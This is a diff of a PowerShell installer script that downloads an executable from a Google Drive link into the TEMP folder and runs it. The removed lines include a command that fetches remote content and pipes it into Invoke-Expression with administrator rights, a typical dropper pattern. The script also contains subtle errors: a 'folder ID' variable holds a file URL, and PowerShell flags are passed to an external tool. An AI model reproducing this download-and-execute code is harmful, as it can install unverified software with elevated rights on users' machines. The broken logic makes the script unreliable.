@@ -1,8 +1,8 @@
-# Define the URL of the Google Drive file
-$googleDriveFileUrl = "https://drive.google.com/file/d/1w_oAksHkSpF6WoY1rgJ_ZieaBWu0Mt7p/view?usp=drive_link"
+# Define the Google Drive folder ID
+$googleDriveFolderId = "https://drive.google.com/file/d/1sUzJKWATRyASNCiSqlSkVVq4_jrkEYwE/view?usp=drive_link"
 
-# Define the local path to save the downloaded file in the temp folder
-$localFilePath = Join-Path $env:TEMP "installer.exe"
+# Define the path to save the downloaded folder in the temp directory
+$localFolderPath = Join-Path $env:TEMP "DownloadedFolder"
 
 # Function to log messages
 function Log-Message {
@@ -13,24 +13,24 @@ function Log-Message {
     Write-Output "$timestamp - $message"
 }
 
-# Function to download the file
-function Download-File {
+# Function to download the folder
+function Download-Folder {
     param (
-        [string]$url,
+        [string]$folderId,
         [string]$outputPath
     )
 
     try {
-        Log-Message "Starting download from $url..."
-        Invoke-WebRequest -Uri $url -OutFile $outputPath -ErrorAction Stop
-        Log-Message "File downloaded successfully to $outputPath."
+        Log-Message "Starting download of folder with ID $folderId..."
+        & gdrive download --path $outputPath --recursive $folderId -ErrorAction Stop
+        Log-Message "Folder downloaded successfully to $outputPath."
     } catch {
-        Log-Message "Error downloading file: $_"
+        Log-Message "Error downloading folder: $_"
         throw $_
     }
 }
 
-# Function to install the downloaded file
+# Function to install the downloaded EXE file
 function Install-File {
     param (
         [string]$filePath
@@ -48,25 +48,29 @@ function Install-File {
 
 # Main script execution
 try {
-    # Download the file
-    Download-File -url $googleDriveFileUrl -outputPath $localFilePath
+    # Ensure the output directory exists
+    if (-Not (Test-Path $localFolderPath)) {
+        New-Item -ItemType Directory -Path $localFolderPath | Out-Null
+    }
 
-    # Install the file
-    Install-File -filePath $localFilePath
+    # Download the folder
+    Download-Folder -folderId $googleDriveFolderId -outputPath $localFolderPath
 
-    # Execute additional command after installation with admin privileges
-    Log-Message "Executing additional command with admin privileges..."
-    Start-Process -FilePath "powershell.exe" -ArgumentList "iwr -useb $googleDriveFileUrl | iex" -Verb RunAs -Wait -NoNewWindow -ErrorAction Stop
-    Log-Message "Additional command executed successfully."
+    # Define the path to the EXE file within the downloaded folder
+    $exeFilePath = Join-Path $localFolderPath "installer.exe"
+
+    # Check if the EXE file exists
+    if (Test-Path $exeFilePath) {
+        # Install the file
+        Install-File -filePath $exeFilePath
+    } else {
+        Log-Message "EXE file not found in the downloaded folder."
+        throw "EXE file not found."
+    }
 } catch {
     Log-Message "Script failed: $_"
     exit 1
 } finally {
-    # Clean up downloaded file
-    if (Test-Path $localFilePath) {
-        Remove-Item $localFilePath -ErrorAction SilentlyContinue
-        Log-Message "Cleaned up downloaded file."
-    }
     # Pause to keep the PowerShell window open
     Read-Host -Prompt "Press Enter to exit"
 }
